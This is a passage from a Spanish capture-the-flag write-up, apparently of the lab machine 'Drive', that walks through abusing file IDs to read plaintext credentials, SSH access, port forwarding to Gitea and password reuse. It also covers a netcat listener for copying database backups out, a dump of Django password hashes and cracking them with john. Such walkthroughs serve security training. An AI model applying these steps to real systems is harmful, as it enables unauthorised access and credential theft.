+<p>Al ejecutar el script podemos observar los ID de los archivos que existe.</p>
+<img src="Img/Pasted image 20240229191008 1.png">
+<img src="Img/Pasted image 20240229195354 1.png">
+<p>En la sección de <strong>Upload File</strong> subimos un archivo.</p>
+<img src="Img/Pasted image 20240229195445 1.png">
+<p>Después de subirlo, somos redirigidos a la sección de archivos donde vemos el nuestro. Al revisar la sección de <strong>Reserve</strong>, notamos que nuestro archivo tiene un enlace asociado.</p>
+<img src="Img/Pasted image 20240229195622 1.png">
+<p>Al acceder vemos de nuevo los identificadores en la URL.</p>
+<img src="Img/Pasted image 20240229200251 1.png">
+<p>Con la diferencia de que ahora al cambiar de ID nos permite ver el contenido del archivo.</p>
+<img src="Img/Pasted image 20240229200929 1.png">
+<p>Al entrar en uno de los ID descubiertos vemos que el archivo guardaba credenciales en texto plan.</p>
+<p>Viendo que esta el puerto 22 abierto conseguimos conectarnos con dichas credenciales.</p>
+<img src="Img/Pasted image 20240229201142 1.png">
+<p>Viendo los procesos que corren con el comando <strong>ps</strong> vemos que el usuario git esta corriendo <strong>gitea</strong>.</p>
+<div class="sourceCode" id="cb11"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true"></a><span class="ex">martin@drive</span>:~$ ps -aux</span></code></pre></div>
+<table>
+<colgroup>
+<col style="width: 9%" />
+<col style="width: 90%" />
+</colgroup>
+<thead>
+<tr class="header">
+<th>Parámetros</th>
+<th>Descripción</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>-a</td>
+<td>Indica que se deben mostrar todos los procesos de todos los usuarios</td>
+</tr>
+<tr class="even">
+<td>-u</td>
+<td>mostrará una lista de todos los procesos actualmente en ejecución que pertenezcan a un usuario</td>
+</tr>
+<tr class="odd">
+<td>-x</td>
+<td>Se utiliza para incluir en la lista los procesos que no están asociados a ninguna terminal de control</td>
+</tr>
+</tbody>
+</table>
+<img src="Img/Pasted image 20240301134100 1.png">
+<p><strong>Gitea</strong> escucha por el puerto <strong>3000</strong>.</p>
+<img src="Img/Pasted image 20240301140413 1.png">
+<h2>Explotación</h2>
+<p>Al ejecutar el comando <strong>ss</strong> para ver los puertos internos del sistema vemos que el <strong>3000</strong> esta en escucha.</p>
+<div class="sourceCode" id="cb12"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true"></a><span class="ex">martin@drive</span>:~$ ss -nlta</span></code></pre></div>
+<table>
+<colgroup>
+<col style="width: 11%" />
+<col style="width: 88%" />
+</colgroup>
+<thead>
+<tr class="header">
+<th>Parámetros</th>
+<th>Descripción</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>-n</td>
+<td>Para mostrar las direcciones IP y los números de puerto en formato numérico</td>
+</tr>
+<tr class="even">
+<td>-l</td>
+<td>Muestra solo las conexiones que están en un estado de “LISTEN”</td>
+</tr>
+<tr class="odd">
+<td>-t</td>
+<td>Muestra únicamente conexiones TCP</td>
+</tr>
+<tr class="even">
+<td>-a</td>
+<td>Muestra tanto conexiones TCP como UDP</td>
+</tr>
+</tbody>
+</table>
+<img src="Img/Pasted image 20240301141440 1.png">
+<p>Si realizamos un <strong>curl</strong> a la dirección <strong>http://localhost:3000</strong> nos muestra el contenido de <strong>gitea</strong>.</p>
+<img src="Img/Pasted image 20240302103831 1.png">
+<p>Para acceder a la página, realizaremos con <strong>ssh</strong> un reenvío de puerto local (<strong>Local Port Forwarding</strong>), permitiendo que el puerto 3000 de la máquina <strong>Drive</strong> se enlace directamente con nuestro puerto 300.</p>
+<div class="sourceCode" id="cb13"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true"></a>❯ <span class="fu">ssh</span> martin@10.10.11.235 -L:3000:127.0.0.1:3000 -fN</span></code></pre></div>
+<table>
+<colgroup>
+<col style="width: 11%" />
+<col style="width: 88%" />
+</colgroup>
+<thead>
+<tr class="header">
+<th>Parámatelos</th>
+<th>Descripción</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>-L</td>
+<td>Indica que se va a realizar un reenvío de puertos local</td>
+</tr>
+<tr class="even">
+<td>-f</td>
+<td>Ejecuta el client SSH en segundo plano</td>
+</tr>
+<tr class="odd">
+<td>-N</td>
+<td>Indica que no va a ejecutar ningún comando remoto después de establecer la conexión SSH</td>
+</tr>
+</tbody>
+</table>
+<p>Tras realizar el <strong>Local Port Forwarding</strong> al acceder a nuestro puerto 3000 vía <strong>HTTP</strong> vemos el contenido del <strong>gitea</strong>.</p>
+<img src="Img/Pasted image 20240302125649 1.png">
+<p>Viendo los usuarios, nos damos cuenta de que está el usuario <strong>martin</strong>.</p>
+<img src="Img/Pasted image 20240302130204 1.png">
+<p>En el panel de login, observamos que podemos reutilizar la contraseña que encontramos anteriormente para conectarnos como el usuario <strong>martinCruz</strong>.</p>
+<img src="Img/Pasted image 20240302132516 1.png">
+<p>Vemos que el usuario “CrisDisel” tiene un repositorio.</p>
+<img src="Img/Pasted image 20240302185359 1.png">
+<p>En el archivo <strong>db_backup.sh</strong> se esta creando de <strong>db.sqlite3</strong> un comprimido para posteriormente guardarlo en <strong>/var/www/backups/</strong> con una contraseña.</p>
+<img src="Img/Pasted image 20240302185034 1.png">
+<p>Dentro de <strong>var/www/backups</strong> vemos los archivos.</p>
+<div class="sourceCode" id="cb14"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true"></a><span class="ex">martin@drive</span>:/var/www/backups$ ls -l</span>
+<span id="cb14-2"><a href="#cb14-2" aria-hidden="true"></a><span class="ex">total</span> 3748</span>
+<span id="cb14-3"><a href="#cb14-3" aria-hidden="true"></a><span class="ex">-rw-rw-r--</span> 1 www-data www-data   14098 Mar  1 06:30 01_Mar_db_backup.sqlite3.7z</span>
+<span id="cb14-4"><a href="#cb14-4" aria-hidden="true"></a><span class="ex">-rw-r--r--</span> 1 www-data www-data   13018 Sep  1  2023 1_Dec_db_backup.sqlite3.7z</span>
+<span id="cb14-5"><a href="#cb14-5" aria-hidden="true"></a><span class="ex">-rw-r--r--</span> 1 www-data www-data   12226 Sep  1  2023 1_Nov_db_backup.sqlite3.7z</span>
+<span id="cb14-6"><a href="#cb14-6" aria-hidden="true"></a><span class="ex">-rw-r--r--</span> 1 www-data www-data   12722 Sep  1  2023 1_Oct_db_backup.sqlite3.7z</span>
+<span id="cb14-7"><a href="#cb14-7" aria-hidden="true"></a><span class="ex">-rw-r--r--</span> 1 www-data www-data   12770 Sep  1  2023 1_Sep_db_backup.sqlite3.7z</span>
+<span id="cb14-8"><a href="#cb14-8" aria-hidden="true"></a><span class="ex">-rwxr-xr-x</span> 1 root     root     3760128 Dec 26  2022 db.sqlite3</span></code></pre></div>
+<p>Añadimos todo el contenido a un archivo comprimido para enviármelo y operar de forma mas cómoda.</p>
+<div class="sourceCode" id="cb15"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true"></a><span class="ex">martin@drive</span>:/tmp$ zip comprimido.zip /var/www/backups/* -j</span>
+<span id="cb15-2"><a href="#cb15-2" aria-hidden="true"></a>  <span class="ex">adding</span>: 01_Mar_db_backup.sqlite3.7z (stored 0%)</span>
+<span id="cb15-3"><a href="#cb15-3" aria-hidden="true"></a>  <span class="ex">adding</span>: 1_Dec_db_backup.sqlite3.7z (stored 0%)</span>
+<span id="cb15-4"><a href="#cb15-4" aria-hidden="true"></a>  <span class="ex">adding</span>: 1_Nov_db_backup.sqlite3.7z (stored 0%)</span>
+<span id="cb15-5"><a href="#cb15-5" aria-hidden="true"></a>  <span class="ex">adding</span>: 1_Oct_db_backup.sqlite3.7z (stored 0%)</span>
+<span id="cb15-6"><a href="#cb15-6" aria-hidden="true"></a>  <span class="ex">adding</span>: 1_Sep_db_backup.sqlite3.7z (stored 0%)</span>
+<span id="cb15-7"><a href="#cb15-7" aria-hidden="true"></a>  <span class="ex">adding</span>: db.sqlite3 (deflated 99%)</span></code></pre></div>
+<table>
+<colgroup>
+<col style="width: 10%" />
+<col style="width: 89%" />
+</colgroup>
+<thead>
+<tr class="header">
+<th>Parámetros</th>
+<th>Descripción</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>-j</td>
+<td>Se utiliza para almacenar los archivos comprimidos sin incluir información de ruta</td>
+</tr>
+</tbody>
+</table>
+<p>Con <strong>netcat</strong> nos ponemos en escucha por el puerto 443 para enviar el comprimido a nuestra maquina.</p>
+<div class="sourceCode" id="cb16"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true"></a>❯ <span class="ex">nc</span> -lvnp 443 <span class="op">&gt;</span> comprimido.zip</span>
+<span id="cb16-2"><a href="#cb16-2" aria-hidden="true"></a><span class="ex">listening</span> on [any] 443 ...</span></code></pre></div>
+<table>
+<colgroup>
+<col style="width: 9%" />
+<col style="width: 90%" />
+</colgroup>
+<thead>
+<tr class="header">
+<th>Parámetros</th>
+<th>Descripción</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>-l</td>
+<td>Indica que se pone en modo escucha en lugar de iniciar una conexión saliente</td>
+</tr>
+<tr class="even">
+<td>-v</td>
+<td>Se utiliza para mostrar información adicional o detalles sobre las operaciones que está realizando</td>
+</tr>
+<tr class="odd">
+<td>-n</td>
+<td>Se evita realizar resolución DNS</td>
+</tr>
+<tr class="even">
+<td>-p</td>
+<td>Indica el puerto por el cual se pondra en escucha</td>
+</tr>
+</tbody>
+</table>
+<img src="Img/Pasted image 20240302195458 1.png">
+<div class="sourceCode" id="cb17"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb17-1"><a href="#cb17-1" aria-hidden="true"></a>❯ <span class="fu">ls</span> -l</span>
+<span id="cb17-2"><a href="#cb17-2" aria-hidden="true"></a><span class="ex">.rw-r--r--</span> root root  14 KB Fri Mar  1 07:30:02 2024 01_Mar_db_backup.sqlite3.7z</span>
+<span id="cb17-3"><a href="#cb17-3" aria-hidden="true"></a><span class="ex">.rw-r--r--</span> root root  13 KB Fri Sep  1 22:00:09 2023 1_Dec_db_backup.sqlite3.7z</span>
+<span id="cb17-4"><a href="#cb17-4" aria-hidden="true"></a><span class="ex">.rw-r--r--</span> root root  12 KB Fri Sep  1 22:00:09 2023 1_Nov_db_backup.sqlite3.7z</span>
+<span id="cb17-5"><a href="#cb17-5" aria-hidden="true"></a><span class="ex">.rw-r--r--</span> root root  12 KB Fri Sep  1 22:00:09 2023 1_Oct_db_backup.sqlite3.7z</span>
+<span id="cb17-6"><a href="#cb17-6" aria-hidden="true"></a><span class="ex">.rw-r--r--</span> root root  12 KB Fri Sep  1 22:00:09 2023 1_Sep_db_backup.sqlite3.7z</span>
+<span id="cb17-7"><a href="#cb17-7" aria-hidden="true"></a><span class="ex">.rw-r--r--</span> root root  84 KB Sat Mar  2 19:54:42 2024 comprimido.zip</span>
+<span id="cb17-8"><a href="#cb17-8" aria-hidden="true"></a><span class="ex">.rwxr-xr-x</span> root root 3.6 MB Mon Dec 26 06:51:24 2022 db.sqlite3</span></code></pre></div>
+<p>Con <strong>sqlite3</strong> vemos ver el contenido del archivo de base de datos <strong>db.sqlite3</strong>.</p>
+<pre class="sqlite"><code>❯ sqlite3 db.sqlite3
+SQLite version 3.34.1 2021-01-20 14:10:07
+Enter &quot;.help&quot; for usage hints.
+sqlite&gt; </code></pre>
+<p>Listamos las tablas.</p>
+<pre class="sqlite"><code>sqlite&gt; .tables
+accounts_customuser                   auth_permission                     
+accounts_customuser_groups            django_admin_log                    
+accounts_customuser_user_permissions  django_content_type                 
+accounts_g                            django_migrations                   
+accounts_g_users                      django_session                      
+auth_group                            myApp_file                          
+auth_group_permissions                myApp_file_groups                   
+sqlite&gt; </code></pre>
+<p>Listamos los datos de la tabla <strong>accounts_customuser</strong>.</p>
+<div class="sourceCode" id="cb20"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb20-1"><a href="#cb20-1" aria-hidden="true"></a><span class="ex">sqlite</span><span class="op">&gt;</span> select * from accounts_customuser<span class="kw">;</span></span>
+<span id="cb20-2"><a href="#cb20-2" aria-hidden="true"></a><span class="ex">21</span><span class="kw">|</span><span class="ex">sha1</span><span class="va">$W5IGzMqPgAUGMKXwKRmi08$0</span>30814d90a6a50ac29bb48e0954a89132302483a<span class="kw">|</span><span class="ex">2022-12-26</span> 05:48:27.497873<span class="kw">|</span><span class="ex">0</span><span class="kw">|</span><span class="ex">jamesMason</span><span class="kw">|||</span><span class="ex">jamesMason@drive.htb</span><span class="kw">|</span><span class="ex">0</span><span class="kw">|</span><span class="ex">1</span><span class="kw">|</span><span class="ex">2022-12-23</span> 12:33:04</span>
+<span id="cb20-3"><a href="#cb20-3" aria-hidden="true"></a><span class="ex">22</span><span class="kw">|</span><span class="ex">sha1</span><span class="va">$E9cadw34Gx4E59Qt18NLXR$6</span>0919b923803c52057c0cdd1d58f0409e7212e9f<span class="kw">|</span><span class="ex">2022-12-24</span> 12:55:10<span class="kw">|</span><span class="ex">0</span><span class="kw">|</span><span class="ex">martinCruz</span><span class="kw">|||</span><span class="ex">martin@drive.htb</span><span class="kw">|</span><span class="ex">0</span><span class="kw">|</span><span class="ex">1</span><span class="kw">|</span><span class="ex">2022-12-23</span> 12:35:02</span>
+<span id="cb20-4"><a href="#cb20-4" aria-hidden="true"></a><span class="ex">23</span><span class="kw">|</span><span class="ex">sha1</span><span class="va">$kyvDtANaFByRUMNSXhjvMc$9</span>e77fb56c31e7ff032f8deb1f0b5e8f42e9e3004<span class="kw">|</span><span class="ex">2022-12-24</span> 13:17:45<span class="kw">|</span><span class="ex">0</span><span class="kw">|</span><span class="ex">tomHands</span><span class="kw">|||</span><span class="ex">tom@drive.htb</span><span class="kw">|</span><span class="ex">0</span><span class="kw">|</span><span class="ex">1</span><span class="kw">|</span><span class="ex">2022-12-23</span> 12:37:45</span>
+<span id="cb20-5"><a href="#cb20-5" aria-hidden="true"></a><span class="ex">24</span><span class="kw">|</span><span class="ex">sha1</span><span class="va">$ALgmoJHkrqcEDinLzpILpD$4</span>b835a084a7c65f5fe966d522c0efcdd1d6f879f<span class="kw">|</span><span class="ex">2022-12-24</span> 16:51:53<span class="kw">|</span><span class="ex">0</span><span class="kw">|</span><span class="ex">crisDisel</span><span class="kw">|||</span><span class="ex">cris@drive.htb</span><span class="kw">|</span><span class="ex">0</span><span class="kw">|</span><span class="ex">1</span><span class="kw">|</span><span class="ex">2022-12-23</span> 12:39:15</span>
+<span id="cb20-6"><a href="#cb20-6" aria-hidden="true"></a><span class="ex">30</span><span class="kw">|</span><span class="ex">sha1</span><span class="va">$jzpj8fqBgy66yby2vX5XPa$5</span>2f17d6118fce501e3b60de360d4c311337836a3<span class="kw">|</span><span class="ex">2022-12-26</span> 05:43:40.388717<span class="kw">|</span><span class="ex">1</span><span class="kw">|</span><span class="ex">admin</span><span class="kw">|||</span><span class="ex">admin@drive.htb</span><span class="kw">|</span><span class="ex">1</span><span class="kw">|</span><span class="ex">1</span><span class="kw">|</span><span class="ex">2022-12-26</span> 05:30:58.003372</span>
+<span id="cb20-7"><a href="#cb20-7" aria-hidden="true"></a><span class="ex">sqlite</span><span class="op">&gt;</span> </span></code></pre></div>
+<p>Vemos varios hashes, tratamos de crackearlos con <strong>john</strong> pero no sabe que tipo de hash es.</p>
+<div class="sourceCode" id="cb21"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb21-1"><a href="#cb21-1" aria-hidden="true"></a>❯ <span class="ex">catn</span> hashes</span>
+<span id="cb21-2"><a href="#cb21-2" aria-hidden="true"></a><span class="ex">sha1</span><span class="va">$W5IGzMqPgAUGMKXwKRmi08$0</span>30814d90a6a50ac29bb48e0954a89132302483a</span>
+<span id="cb21-3"><a href="#cb21-3" aria-hidden="true"></a><span class="ex">sha1</span><span class="va">$E9cadw34Gx4E59Qt18NLXR$6</span>0919b923803c52057c0cdd1d58f0409e7212e9f</span>
+<span id="cb21-4"><a href="#cb21-4" aria-hidden="true"></a><span class="ex">sha1</span><span class="va">$kyvDtANaFByRUMNSXhjvMc$9</span>e77fb56c31e7ff032f8deb1f0b5e8f42e9e3004</span>
+<span id="cb21-5"><a href="#cb21-5" aria-hidden="true"></a><span class="ex">sha1</span><span class="va">$ALgmoJHkrqcEDinLzpILpD$4</span>b835a084a7c65f5fe966d522c0efcdd1d6f879f</span>
+<span id="cb21-6"><a href="#cb21-6" aria-hidden="true"></a><span class="ex">sha1</span><span class="va">$jzpj8fqBgy66yby2vX5XPa$5</span>2f17d6118fce501e3b60de360d4c311337836a3</span>
+<span id="cb21-7"><a href="#cb21-7" aria-hidden="true"></a>❯ <span class="ex">john</span> -w /usr/share/wordlists/rockyou.txt hashes</span>
+<span id="cb21-8"><a href="#cb21-8" aria-hidden="true"></a><span class="ex">Warning</span>: only loading hashes of type <span class="st">&quot;tripcode&quot;</span>, but also saw type <span class="st">&quot;descrypt&quot;</span></span>
+<span id="cb21-9"><a href="#cb21-9" aria-hidden="true"></a><span class="ex">Use</span> the <span class="st">&quot;--format=descrypt&quot;</span> option to force loading hashes of that type instead</span>
+<span id="cb21-10"><a href="#cb21-10" aria-hidden="true"></a><span class="ex">Warning</span>: only loading hashes of type <span class="st">&quot;tripcode&quot;</span>, but also saw type <span class="st">&quot;pix-md5&quot;</span></span>
+<span id="cb21-11"><a href="#cb21-11" aria-hidden="true"></a><span class="ex">Use</span> the <span class="st">&quot;--format=pix-md5&quot;</span> option to force loading hashes of that type instead</span>
+<span id="cb21-12"><a href="#cb21-12" aria-hidden="true"></a><span class="ex">Warning</span>: only loading hashes of type <span class="st">&quot;tripcode&quot;</span>, but also saw type <span class="st">&quot;mysql&quot;</span></span>
+<span id="cb21-13"><a href="#cb21-13" aria-hidden="true"></a><span class="ex">Use</span> the <span class="st">&quot;--format=mysql&quot;</span> option to force loading hashes of that type instead</span>
+<span id="cb21-14"><a href="#cb21-14" aria-hidden="true"></a><span class="ex">Warning</span>: only loading hashes of type <span class="st">&quot;tripcode&quot;</span>, but also saw type <span class="st">&quot;oracle&quot;</span></span>
+<span id="cb21-15"><a href="#cb21-15" aria-hidden="true"></a><span class="ex">Use</span> the <span class="st">&quot;--format=oracle&quot;</span> option to force loading hashes of that type instead</span>
+<span id="cb21-16"><a href="#cb21-16" aria-hidden="true"></a><span class="ex">Warning</span>: only loading hashes of type <span class="st">&quot;tripcode&quot;</span>, but also saw type <span class="st">&quot;Raw-SHA1&quot;</span></span>
+<span id="cb21-17"><a href="#cb21-17" aria-hidden="true"></a><span class="ex">Use</span> the <span class="st">&quot;--format=Raw-SHA1&quot;</span> option to force loading hashes of that type instead</span>
+<span id="cb21-18"><a href="#cb21-18" aria-hidden="true"></a><span class="ex">Warning</span>: only loading hashes of type <span class="st">&quot;tripcode&quot;</span>, but also saw type <span class="st">&quot;LM&quot;</span></span>
+<span id="cb21-19"><a href="#cb21-19" aria-hidden="true"></a><span class="ex">Use</span> the <span class="st">&quot;--format=LM&quot;</span> option to force loading hashes of that type instead</span>
+<span id="cb21-20"><a href="#cb21-20" aria-hidden="true"></a><span class="ex">Warning</span>: only loading hashes of type <span class="st">&quot;tripcode&quot;</span>, but also saw type <span class="st">&quot;Raw-SHA1-AxCrypt&quot;</span></span>
+<span id="cb21-21"><a href="#cb21-21" aria-hidden="true"></a><span class="ex">Use</span> the <span class="st">&quot;--format=Raw-SHA1-AxCrypt&quot;</span> option to force loading hashes of that type instead</span>
+<span id="cb21-22"><a href="#cb21-22" aria-hidden="true"></a><span class="ex">Warning</span>: only loading hashes of type <span class="st">&quot;tripcode&quot;</span>, but also saw type <span class="st">&quot;bfegg&quot;</span></span>
+<span id="cb21-23"><a href="#cb21-23" aria-hidden="true"></a><span class="ex">Use</span> the <span class="st">&quot;--format=bfegg&quot;</span> option to force loading hashes of that type instead</span>
+<span id="cb21-24"><a href="#cb21-24" aria-hidden="true"></a><span class="ex">Warning</span>: invalid UTF-8 seen reading /usr/share/wordlists/rockyou.txt</span>
+<span id="cb21-25"><a href="#cb21-25" aria-hidden="true"></a><span class="ex">Warning</span>: only loading hashes of type <span class="st">&quot;tripcode&quot;</span>, but also saw type <span class="st">&quot;dynamic=md5(</span><span class="va">$p</span><span class="st">)&quot;</span></span>
+<span id="cb21-26"><a href="#cb21-26" aria-hidden="true"></a><span class="ex">Use</span> the <span class="st">&quot;--format=dynamic=md5(</span><span class="va">$p</span><span class="st">)&quot;</span> option to force loading hashes of that type instead</span>
+<span id="cb21-27"><a href="#cb21-27" aria-hidden="true"></a><span class="ex">Warning</span>: only loading hashes of type <span class="st">&quot;tripcode&quot;</span>, but also saw type <span class="st">&quot;Raw-SHA256&quot;</span></span>
+<span id="cb21-28"><a href="#cb21-28" aria-hidden="true"></a><span class="ex">Use</span> the <span class="st">&quot;--format=Raw-SHA256&quot;</span> option to force loading hashes of that type instead</span>
+<span id="cb21-29"><a href="#cb21-29" aria-hidden="true"></a><span class="ex">Warning</span>: only loading hashes of type <span class="st">&quot;tripcode&quot;</span>, but also saw type <span class="st">&quot;HAVAL-128-4&quot;</span></span>
+<span id="cb21-30"><a href="#cb21-30" aria-hidden="true"></a><span class="ex">Use</span> the <span class="st">&quot;--format=HAVAL-128-4&quot;</span> option to force loading hashes of that type instead</span>
+<span id="cb21-31"><a href="#cb21-31" aria-hidden="true"></a><span class="ex">Warning</span>: only loading hashes of type <span class="st">&quot;tripcode&quot;</span>, but also saw type <span class="st">&quot;HMAC-SHA256&quot;</span></span>
+<span id="cb21-32"><a href="#cb21-32" aria-hidden="true"></a><span class="ex">Use</span> the <span class="st">&quot;--format=HMAC-SHA256&quot;</span> option to force loading hashes of that type instead</span>
+<span id="cb21-33"><a href="#cb21-33" aria-hidden="true"></a><span class="ex">Warning</span>: only loading hashes of type <span class="st">&quot;tripcode&quot;</span>, but also saw type <span class="st">&quot;HMAC-SHA512&quot;</span></span>
+<span id="cb21-34"><a href="#cb21-34" aria-hidden="true"></a><span class="ex">Use</span> the <span class="st">&quot;--format=HMAC-SHA512&quot;</span> option to force loading hashes of that type instead</span>
+<span id="cb21-35"><a href="#cb21-35" aria-hidden="true"></a><span class="ex">Warning</span>: only loading hashes of type <span class="st">&quot;tripcode&quot;</span>, but also saw type <span class="st">&quot;Tiger&quot;</span></span>
+<span id="cb21-36"><a href="#cb21-36" aria-hidden="true"></a><span class="ex">Use</span> the <span class="st">&quot;--format=Tiger&quot;</span> option to force loading hashes of that type instead</span>
+<span id="cb21-37"><a href="#cb21-37" aria-hidden="true"></a><span class="ex">Warning</span>: only loading hashes of type <span class="st">&quot;tripcode&quot;</span>, but also saw type <span class="st">&quot;lotus5&quot;</span></span>
+<span id="cb21-38"><a href="#cb21-38" aria-hidden="true"></a><span class="ex">Use</span> the <span class="st">&quot;--format=lotus5&quot;</span> option to force loading hashes of that type instead</span>
+<span id="cb21-39"><a href="#cb21-39" aria-hidden="true"></a><span class="ex">Warning</span>: only loading hashes of type <span class="st">&quot;tripcode&quot;</span>, but also saw type <span class="st">&quot;HMAC-SHA224&quot;</span></span>
+<span id="cb21-40"><a href="#cb21-40" aria-hidden="true"></a><span class="ex">Use</span> the <span class="st">&quot;--format=HMAC-SHA224&quot;</span> option to force loading hashes of that type instead</span>
+<span id="cb21-41"><a href="#cb21-41" aria-hidden="true"></a><span class="ex">Warning</span>: only loading hashes of type <span class="st">&quot;tripcode&quot;</span>, but also saw type <span class="st">&quot;MD2&quot;</span></span>
+<span id="cb21-42"><a href="#cb21-42" aria-hidden="true"></a><span class="ex">Use</span> the <span class="st">&quot;--format=MD2&quot;</span> option to force loading hashes of that type instead</span>
+<span id="cb21-43"><a href="#cb21-43" aria-hidden="true"></a><span class="ex">Warning</span>: only loading hashes of type <span class="st">&quot;tripcode&quot;</span>, but also saw type <span class="st">&quot;Raw-SHA1-Linkedin&quot;</span></span>
+<span id="cb21-44"><a href="#cb21-44" aria-hidden="true"></a><span class="ex">Use</span> the <span class="st">&quot;--format=Raw-SHA1-Linkedin&quot;</span> option to force loading hashes of that type instead</span>
+<span id="cb21-45"><a href="#cb21-45" aria-hidden="true"></a><span class="ex">Warning</span>: only loading hashes of type <span class="st">&quot;tripcode&quot;</span>, but also saw type <span class="st">&quot;mdc2&quot;</span></span>
+<span id="cb21-46"><a href="#cb21-46" aria-hidden="true"></a><span class="ex">Use</span> the <span class="st">&quot;--format=mdc2&quot;</span> option to force loading hashes of that type instead</span>
+<span id="cb21-47"><a href="#cb21-47" aria-hidden="true"></a><span class="ex">Warning</span>: only loading hashes of type <span class="st">&quot;tripcode&quot;</span>, but also saw type <span class="st">&quot;mscash&quot;</span></span>
+<span id="cb21-48"><a href="#cb21-48" aria-hidden="true"></a><span class="ex">Use</span> the <span class="st">&quot;--format=mscash&quot;</span> option to force loading hashes of that type instead</span>
+<span id="cb21-49"><a href="#cb21-49" aria-hidden="true"></a><span class="ex">Warning</span>: only loading hashes of type <span class="st">&quot;tripcode&quot;</span>, but also saw type <span class="st">&quot;mscash2&quot;</span></span>
+<span id="cb21-50"><a href="#cb21-50" aria-hidden="true"></a><span class="ex">Use</span> the <span class="st">&quot;--format=mscash2&quot;</span> option to force loading hashes of that type instead</span>
+<span id="cb21-51"><a href="#cb21-51" aria-hidden="true"></a><span class="ex">Warning</span>: only loading hashes of type <span class="st">&quot;tripcode&quot;</span>, but also saw type <span class="st">&quot;Raw-SHA224&quot;</span></span>
+<span id="cb21-52"><a href="#cb21-52" aria-hidden="true"></a><span class="ex">Use</span> the <span class="st">&quot;--format=Raw-SHA224&quot;</span> option to force loading hashes of that type instead</span>
+<span id="cb21-53"><a href="#cb21-53" aria-hidden="true"></a><span class="ex">Warning</span>: only loading hashes of type <span class="st">&quot;tripcode&quot;</span>, but also saw type <span class="st">&quot;Palshop&quot;</span></span>
+<span id="cb21-54"><a href="#cb21-54" aria-hidden="true"></a><span class="ex">Use</span> the <span class="st">&quot;--format=Palshop&quot;</span> option to force loading hashes of that type instead</span>
+<span id="cb21-55"><a href="#cb21-55" aria-hidden="true"></a><span class="ex">Warning</span>: only loading hashes of type <span class="st">&quot;tripcode&quot;</span>, but also saw type <span class="st">&quot;NT&quot;</span></span>
+<span id="cb21-56"><a href="#cb21-56" aria-hidden="true"></a><span class="ex">Use</span> the <span class="st">&quot;--format=NT&quot;</span> option to force loading hashes of that type instead</span>
+<span id="cb21-57"><a href="#cb21-57" aria-hidden="true"></a><span class="ex">Warning</span>: only loading hashes of type <span class="st">&quot;tripcode&quot;</span>, but also saw type <span class="st">&quot;ripemd-160&quot;</span></span>
+<span id="cb21-58"><a href="#cb21-58" aria-hidden="true"></a><span class="ex">Use</span> the <span class="st">&quot;--format=ripemd-160&quot;</span> option to force loading hashes of that type instead</span>
+<span id="cb21-59"><a href="#cb21-59" aria-hidden="true"></a><span class="ex">Warning</span>: only loading hashes of type <span class="st">&quot;tripcode&quot;</span>, but also saw type <span class="st">&quot;Raw-MD4&quot;</span></span>
+<span id="cb21-60"><a href="#cb21-60" aria-hidden="true"></a><span class="ex">Use</span> the <span class="st">&quot;--format=Raw-MD4&quot;</span> option to force loading hashes of that type instead</span>
+<span id="cb21-61"><a href="#cb21-61" aria-hidden="true"></a><span class="ex">Warning</span>: only loading hashes of type <span class="st">&quot;tripcode&quot;</span>, but also saw type <span class="st">&quot;Raw-MD5&quot;</span></span>
+<span id="cb21-62"><a href="#cb21-62" aria-hidden="true"></a><span class="ex">Use</span> the <span class="st">&quot;--format=Raw-MD5&quot;</span> option to force loading hashes of that type instead</span>
+<span id="cb21-63"><a href="#cb21-63" aria-hidden="true"></a><span class="ex">Warning</span>: only loading hashes of type <span class="st">&quot;tripcode&quot;</span>, but also saw type <span class="st">&quot;hMailServer&quot;</span></span>
+<span id="cb21-64"><a href="#cb21-64" aria-hidden="true"></a><span class="ex">Use</span> the <span class="st">&quot;--format=hMailServer&quot;</span> option to force loading hashes of that type instead</span>
+<span id="cb21-65"><a href="#cb21-65" aria-hidden="true"></a><span class="ex">Warning</span>: only loading hashes of type <span class="st">&quot;tripcode&quot;</span>, but also saw type <span class="st">&quot;Raw-MD5u&quot;</span></span>
+<span id="cb21-66"><a href="#cb21-66" aria-hidden="true"></a><span class="ex">Use</span> the <span class="st">&quot;--format=Raw-MD5u&quot;</span> option to force loading hashes of that type instead</span>
+<span id="cb21-67"><a href="#cb21-67" aria-hidden="true"></a><span class="ex">Warning</span>: only loading hashes of type <span class="st">&quot;tripcode&quot;</span>, but also saw type <span class="st">&quot;ripemd-128&quot;</span></span>
+<span id="cb21-68"><a href="#cb21-68" aria-hidden="true"></a><span class="ex">Use</span> the <span class="st">&quot;--format=ripemd-128&quot;</span> option to force loading hashes of that type instead</span>
+<span id="cb21-69"><a href="#cb21-69" aria-hidden="true"></a><span class="ex">Warning</span>: only loading hashes of type <span class="st">&quot;tripcode&quot;</span>, but also saw type <span class="st">&quot;gost&quot;</span></span>
+<span id="cb21-70"><a href="#cb21-70" aria-hidden="true"></a><span class="ex">Use</span> the <span class="st">&quot;--format=gost&quot;</span> option to force loading hashes of that type instead</span>
+<span id="cb21-71"><a href="#cb21-71" aria-hidden="true"></a><span class="ex">Warning</span>: only loading hashes of type <span class="st">&quot;tripcode&quot;</span>, but also saw type <span class="st">&quot;Snefru-128&quot;</span></span>
+<span id="cb21-72"><a href="#cb21-72" aria-hidden="true"></a><span class="ex">Use</span> the <span class="st">&quot;--format=Snefru-128&quot;</span> option to force loading hashes of that type instead</span>
